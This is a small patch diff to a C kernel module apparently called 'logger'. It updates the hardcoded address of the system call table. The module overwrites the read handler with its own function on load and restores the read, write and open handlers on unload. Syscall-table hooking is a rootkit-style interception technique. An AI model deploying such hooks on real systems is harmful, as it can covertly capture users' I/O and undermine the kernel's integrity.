@@ -158,7 +158,7 @@ logger_close(int fd)
 static int __init
 logger_start(void)
 {
-    unsigned long *sys_call_table = (unsigned long*)0xc000e168;
+    unsigned long *sys_call_table = (unsigned long*)0xc0010568;
     orig_read = (void*)sys_call_table[__NR_read];
     sys_call_table[__NR_read] = (unsigned long)logger_read;
 
@@ -186,7 +186,7 @@ logger_start(void)
 static void __exit
 logger_stop(void)
 {
-    unsigned long *sys_call_table = (unsigned long*)0xc000e168;
+    unsigned long *sys_call_table = (unsigned long*)0xc0010568;
     sys_call_table[__NR_read] = (unsigned long)orig_read;
     sys_call_table[__NR_write] = (unsigned long)orig_write;
     sys_call_table[__NR_open] = (unsigned long)orig_open;
